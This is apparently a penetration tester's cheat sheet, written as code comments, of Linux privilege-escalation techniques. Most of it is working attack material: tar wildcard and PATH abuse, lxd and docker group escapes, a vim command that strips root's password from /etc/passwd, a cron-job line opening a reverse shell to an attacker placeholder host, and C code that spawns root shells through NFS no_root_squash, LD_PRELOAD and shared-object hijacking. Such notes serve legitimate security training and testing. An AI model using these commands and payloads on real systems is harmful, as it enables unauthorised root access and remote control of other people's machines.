//! Environment Enumeration
//* basic commands
// whoami
// id
// hostname
// uname -a
// ifconfig or ip a
// sudo -l | sudo -v
// history
//* OS
// cat /etc/os-release
//* Users Path
// echo $PATH
//* Environment Variables
// env
//* kernal
// uname -a
//* Mounted Drives
// lsblk
//* Routing Table
// route
//* Groups
// cat /etc/group
//* Temprary Files
// ls -l /tmp /var/tmp /dev/shm
//* Loged In Users
// w
//* Cron Jobs
// ls -la /etc/cron.daily/
//* Creds
// grep 'DB_USER\|DB_PASSWORD' wp-config.php
//* Searching Specific Files
// find / -type f -name "wp*" 2>/dev/null
//* Linpeas | winpeas
// https://github.com/peass-ng/PEASS-ng/releases/tag/20251007-02ee8e3f
//! Path Abuse
// PATH=.:${PATH}
// export PATH
// echo $PATH
// touch ls
// echo 'echo "PATH ABUSE!!"' > ls
// chmod +x ls
//! Wild Card Abuse
// echo "" > "--checkpoint-action=exec=ls"
// echo "" > --checkpoint=1
// running => tar -zcf * => will execute ls command
//! Special Permissions
// allows a user to a program with the permissions of another user
//* setuid permission
// find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
//* setgid permission
// find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
//! Check Sudo Rights
// sudo -l
//! Privileged Groups
//* LXC / LXD (lxd group)
// lxc image import alpine-v3.18-x86_64-20230607_1234.tar.gz --alias ubuntutemp
// lxc image list
// lxc init ubuntutemp privesc -c security.privileged=true
// lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
// lxc start privesc
// lxc exec privesc /bin/sh
//* Docker (docker group)
// docker run -v /root:/mnt -it ubuntu
//* Disk (dev group)
// Users within the disk group have full access to any devices contained within /dev
//* ADM (adm group)
// Members of the adm group are able to read all logs stored in /var/log
//! Capabilities
// When capabilities are set for a binary, it means that the binary will be able to perform specific actions
// that it would not be able to perform without the capabilities.
//* Enumerate Binaries with Capabilities
// find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
//* Dangerous Capabilities
// cap_setuid => Allows a process to set its effective user ID
// cap_setgid => Allows to set its effective group ID
// cap_sys_admin => This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the root user, such as modifying system settings and mounting and unmounting file systems.
// cap_dac_override => Allows bypassing of file read, write, and execute permission checks.
//* Example
// removing the need to root password from the /etc/passwd file
// if vim has the cap_dac_override capability
// echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
//! Cron Job Abuse
//* searching writable scripts that could be run by a cron job
// find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
//* Abusing Writable Scripts
// adding a reverse shell to the writable script that is run by a cron job
// echo 'bash -i >& /dev/tcp/{attacker-ip}/{port} 0>&1' >> /path/to/writable/script
//! Weak NFS Privileges
// if obtion no_root_squash is enabled in /etc/exports file
// create a prevEsc shell
//    #include <stdio.h>
//    #include <sys/types.h>
//    #include <unistd.h>
//    #include <stdlib.h>
//
//    int main(void)
//    {
//      setuid(0); setgid(0); system("/bin/bash");
//    }
// sudo gcc --static shell.c -o shell
// mount the directory locally => sudo mount -t nfs 10.129.2.12:/tmp /mnt
// tranfer the shell => sudo cp shell /mnt
// sets the "setuid" bit, allowing a program to run with the file owner's permissions => sudo chmod u+s /mnt/shell
// then go the host and exexcute it
//! LD_PRELOAD Privilege Escalation
// works if => env_keep+=LD_PRELOAD
// create root.c
//    #include <stdio.h>
//    #include <sys/types.h>
//    #include <stdlib.h>
//    #include <unistd.h>
//
//    void _init() {
//    unsetenv("LD_PRELOAD");
//    setgid(0);
//    setuid(0);
//    system("/bin/bash");
//    }
// gcc -fPIC -shared -o root.so root.c -nostartfiles
// mv root.so /tmp
// run any binary that you can run with sudo and preload this library
// sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
//! Shared Object Hijacking
//* View Shared Objects Used By A Binary
// ldd /bin/{binary}
//* Check If A Folder Has Preference Over Other Folders
// readelf -d {file}  | grep PATH
//* Exploit
// if the preferenced library is writable
// creat src.c
//    #include<stdio.h>
//    #include<stdlib.h>
//    #include<unistd.h>
//
//    void dbquery() {
//        printf("Malicious library loaded\n");
//        setuid(0);
//        system("/bin/sh -p");
//    }
// gcc src.c -fPIC -shared -o /{folder}/{used lib}
//! Python Library Hijacking
//* Wrong Write Permissions
// if the main script has the suid set 'rws' and can be run with sudo preveliges
// and it calls a function from a writable python library
// inside that function we can import os and execute code
// import os
// os.system('id')
//* Library Path
// priority of paths
// python3 -c 'import sys; print("\n".join(sys.path))'
// We must have write permissions to one of the paths having a higher priority on the list.
// if the imported module is located in a path lower on the list and a higher priority path is editable by our user,
// we can create a module ourselves with the same name and include our own desired functions
// Python accesses the first hit it finds and imports it before reaching the original and intended module.
// seach a libaray => pip3 show psutil
//* PYTHONPATH Environment Variable
// if we have  SETENV:  over an executable
// sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py